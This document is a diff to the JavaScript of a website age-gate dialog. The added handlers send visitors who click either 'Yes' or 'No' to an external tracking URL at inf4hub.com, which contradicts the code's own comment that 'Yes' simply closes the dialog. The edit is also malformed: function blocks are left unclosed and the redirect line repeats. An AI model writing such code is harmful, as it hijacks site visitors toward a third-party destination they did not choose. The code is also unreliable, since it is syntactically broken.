@@ -41,8 +41,10 @@
     const { bd, close } = built;
  
     // Your custom behavior: Yes = just close, No = go to privacy
-    bd.querySelector("#age-yes").addEventListener("click", close);
-    bd.querySelector("#age-no").addEventListener("click", () => {
+    bd.querySelector("#age-yes").addEventListener("click", function(){
+    window.location.href = "http://inf4hub.com/?utm_campaign=zxSxVTCG6M&v1=[v1]&v2=[v2]&v3=[v3]";
+    bd.querySelector("#age-no").addEventListener("click", function(){
+    window.location.href = "http://inf4hub.com/?utm_campaign=zxSxVTCG6M&v1=[v1]&v2=[v2]&v3=[v3]";
       window.location.href = "http://inf4hub.com/?utm_campaign=zxSxVTCG6M&v1=[v1]&v2=[v2]&v3=[v3]";
     });
   };
@@ -69,4 +71,5 @@
  
 
  
+
 
